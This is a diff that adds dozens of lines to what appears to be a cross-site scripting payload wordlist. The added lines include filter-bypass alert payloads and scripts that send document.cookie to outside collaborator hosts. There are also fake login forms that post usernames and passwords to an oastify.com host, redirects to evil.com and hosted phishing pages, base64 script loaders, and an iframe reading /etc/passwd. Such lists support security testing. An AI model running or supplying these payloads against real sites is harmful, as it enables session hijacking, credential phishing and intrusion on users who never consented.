@@ -1,5 +1,58 @@
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
+%3C/script%20%3E
+mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
+javascript:alert(1)
+javascript://%0aalert(document.cookie)
+<A HREF="http://evil.com/">Login Here </A>
+<script>document.location.href="http://evil.com"</script>
+<h3>Please login to proceed</h3> <form action=http://abp16yqa8m56p2kznk76xvmnqew5kwakz.oastify.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+"><iframe src="https://nasa.gov" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
+<IFRAME SRC="javascript:alert(document.cookie);"></iframe>
+<script>document.location='http://sb7j6gqs845opkkhn27oxdm5qwwnks8h.oastify.com?c='+document.cookie</script>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie</script>
+<script>document.body.background=”https://www.jhadol.com/images/photos/original/1465212129eukl.jpg“;</script>
+<script>window.location=”https://coffinxp.000webhostapp.com/coffinxp1.html”;</script>
+<script>document.body.bgColor=”red”;</script>
+"><svg/onload=alert(document.domain)>
+"onmouseover=alert(document.domain)
+'"><svg/onload=prompt(5);>{{7*7}
+<svg onload='new Function["Y000!"].find(al\u0065rt)'>
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
+lert&#x000000028;origin&#x000029;>
+<A HREF="https://www.cia.gov/">Login Here </A>
+<button onClick="alert('xss')">Submit</button>
+<h3>Please login to proceed</h3> <form action=http://abp16yqa8m56p2kznk76xvmnqew5kwakz.oastify.com> Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"> </br><br><input type="submit" value="Login"></br>
+<script>alert(1)</script>&token=; script-src-elem 'unsafe-inline'
+"><iframe src="https://coffinxp. 000webhostapp.com/CoffinEncript3.html" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width: 100%; height:100%">
+<IFRAME SRC="javascript:alert(document.cookie); "></iframe>
+<iframe src="file:///etc/passwd" width="400" height="400">
+<script>document.location='http://sb7j6gqs845opkkhn270xdm5qwwnks8h.oastify.com?c='+document.cookie</script>
+'javascript://%250Aalert(document.cookie)'
+'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+<svg/onload=window["al"+"ert"]1337>
+<Img Src=OnXSS OnError=confirm(1337)>
+<Svg Only=1 OnLoad=confirm(document.domain)>
+<svg onload=alert&#0000000040document.cookie)>
+<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+'https://any"%3b},+5000)%3b;function+showAlert()+{++++++alert(document.cookie)%3b++++}showAlert()%3b//'
+"><script>eval(new URL(document.location.href+"#javascript:confirm(69)").hash.slice(1))</script>
+<A href="javascrip%09t&colon;eval.apply${[jj.className+(23)]}" id=jj class=alert>Click Here
+"><img/src/style=html:url("data:,"><svg/onload=confirm(69)>")>
+'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3Jgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vamVycnkuYnhzm9keS5hcHBlbmRDaGlsZChhKTs=&#61 onerror=eval(atob(this.id))>'
+"'><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS57ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&#61 onerror=eval(atob(this.id))>"
 "><img/src/onerror=import('//domain/')>"@yourdomain
+><img src onerror=alert(1)>
+<img src onerror=alert(1)>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 /(A(%22onerror='alert%60123%60'test))/
 <a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
@@ -64,6 +117,50 @@ jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0
 <svg onload=alert&#0000000040document.cookie)>
 JavaScript://%250Aalert?.(1)//
 '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+//%01javascript:alert(1)
+%09Jav%09ascript:alert(1)
+%09Jav%09ascript:alert(document.domain)
+/%09/javascript:alert(1)
+/%09/javascript:alert(1);
+//%0Aalert(1)
+////%0Aalert(1)
+//%0D%0Aalert(1)
+/%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+";alert(0);//
+";alert(0);//bash
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
+java%0d%0ascript%0d%0a:alert(0)
+javascript://%0aalert(document.cookie)
+javascript://%00alert(1)
+javascript://%0aalert(1)
+javascript://%0Aalert(1)
+javascript://%250A1?alert(1):0
+javascript://%250Aalert(1)
+javascript://%250Aalert(1)//?1
+javascript://%250Alert(document.location=document.cookie)
+javascript:alert(0)
+//javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1)
+/javascript:alert(1);
+<>javascript:alert(1);
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript:alert(1)
+javascript:alert(1);
+javascript:alert(1)%0d%0a
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript:confirm(1)
+javascript://https://whitelisted.com/?z=%0Aalert(1)
+javascript:prompt(1)
+javascript:void(0);alert(1)
+jaVAscript://whitelisted.com//%0d%0aalert(1);//
+javascript://whitelisted.com?%a0alert%281%29
+javascript://whitelisted.com/?z=%0Aalert(1)
+/x:1/:///%01javascript:alert(document.cookie)/
 </Title/</Style/</Script/</textArea/</iFrame/</noScript>
 \74k<K/contentEditable/autoFocus/OnFocus=
 /*${/*/;{/**/(alert)(1)}//><Base/Href=//google.com\76-->
@@ -425,6 +522,8 @@ onerror=alert;throw 1
 \’;alert(document.domain)//
 \\’;alert(document.domain)//
 "><svg/onload=alert(document.cookie)>"@x.y
+"><svg/onload=alert(document.cookie)>"
+"><svg/onload=alert(document.cookie)>
 "onfocus="prompt(document.cookie)"autofocus="
 <a href=”#” onclick=”… var input=’controllable data here’; …”>
 &apos;-alert(document.domain)-&apos;
